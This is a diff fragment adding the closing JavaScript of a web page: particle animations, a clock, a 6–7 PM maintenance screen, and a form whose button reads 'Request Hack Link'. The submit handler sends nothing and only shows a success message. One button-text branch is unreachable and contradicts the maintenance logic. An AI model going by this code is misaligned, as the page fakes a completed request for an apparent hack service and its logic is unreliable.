+                    particle.style.background = color;
+                    
+                    // Random animation duration
+                    const duration = Math.random() * 20 + 10;
+                    particle.style.animationDuration = `${duration}s`;
+                    
+                    // Random delay
+                    const delay = Math.random() * 5;
+                    particle.style.animationDelay = `${delay}s`;
+                    
+                    particlesContainer.appendChild(particle);
+                }
+            }
+            
+            // Check if current time is between 6 PM and 7 PM
+            function isMaintenanceTime() {
+                const now = new Date();
+                const currentHour = now.getHours();
+                return currentHour >= 18 && currentHour < 19;
+            }
+            
+            // Update maintenance countdown
+            function updateMaintenanceCountdown() {
+                const now = new Date();
+                const endTime = new Date();
+                endTime.setHours(19, 0, 0, 0); // 7:00 PM
+                
+                const timeDiff = endTime - now;
+                
+                if (timeDiff > 0) {
+                    const hours = Math.floor(timeDiff / (1000 * 60 * 60));
+                    const minutes = Math.floor((timeDiff % (1000 * 60 * 60)) / (1000 * 60));
+                    const seconds = Math.floor((timeDiff % (1000 * 60)) / 1000);
+                    
+                    maintenanceHours.textContent = hours.toString().padStart(2, '0');
+                    maintenanceMinutes.textContent = minutes.toString().padStart(2, '0');
+                    maintenanceSeconds.textContent = seconds.toString().padStart(2, '0');
+                }
+            }
+            
+            // Update timer every second
+            function updateTimer() {
+                const now = new Date();
+                const currentHour = now.getHours();
+                const currentMinute = now.getMinutes();
+                const currentSecond = now.getSeconds();
+                
+                // Format time display
+                hoursElement.textContent = currentHour.toString().padStart(2, '0');
+                minutesElement.textContent = currentMinute.toString().padStart(2, '0');
+                secondsElement.textContent = currentSecond.toString().padStart(2, '0');
+                
+                // Check if current time is between 6 PM and 7 PM
+                const isRequestTime = currentHour >= 18 && currentHour < 19;
+                
+                // Show/hide maintenance mode
+                if (isRequestTime) {
+                    maintenanceMode.style.display = 'flex';
+                    mainContent.style.display = 'none';
+                    updateMaintenanceCountdown();
+                } else {
+                    maintenanceMode.style.display = 'none';
+                    mainContent.style.display = 'block';
+                    
+                    // Enable/disable form based on time
+                    submitBtn.disabled = isRequestTime;
+                    
+                    if (!isRequestTime) {
+                        submitBtn.innerHTML = '<i class="fas fa-paper-plane"></i> Request Hack Link';
+                        submitBtn.style.background = 'linear-gradient(to right, var(--primary), var(--secondary))';
+                    } else {
+                        submitBtn.innerHTML = '<i class="fas fa-clock"></i> Available only between 6 PM - 7 PM';
+                        submitBtn.style.background = '#666';
+                    }
+                }
+            }
+            
+            // Initial setup
+            createParticles();
+            updateTimer();
+            
+            // Update timer every second
+            setInterval(updateTimer, 1000);
+            
+            // Update maintenance countdown every second
+            setInterval(updateMaintenanceCountdown, 1000);
+            
+            // Form submission
+            form.addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                // Show success message with animation
+                successMessage.style.display = 'block';
+                
+                // Reset form
+                form.reset();
+                
+                // Hide success message after 5 seconds
+                setTimeout(function() {
+                    successMessage.style.display = 'none';
+                }, 5000);
+            });
+        });
+    </script>
 </body>
 </html>
